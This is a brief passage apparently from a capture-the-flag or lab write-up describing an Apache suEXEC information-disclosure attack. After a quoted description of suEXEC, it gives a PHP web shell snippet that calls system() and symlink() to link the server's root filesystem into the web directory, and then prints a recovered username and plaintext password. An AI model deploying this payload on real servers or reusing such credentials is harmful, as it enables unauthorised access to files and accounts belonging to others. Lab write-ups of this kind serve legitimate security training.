# Apache suEXEC - Information Disclosure

The suEXEC feature provides Apache users the ability to run CGI and SSI programs
under user IDs different from the user ID of the calling web server. Normally,
when a CGI or SSI program executes, it runs as the same user who is running the
web server.
Used properly, this feature can reduce considerably the security risks involved
with allowing users to develop and run private CGI or SSI programs.

if we upload this php file like we did in write1 it will create a symlink with / in test99.php
<?php
        system("ln -sf / test99.php");
        symlink("/", "test99.php");
?>

We can access root filesystem and this password lmezard:G!@M6f4Eatau{sF"

then follow writeup1
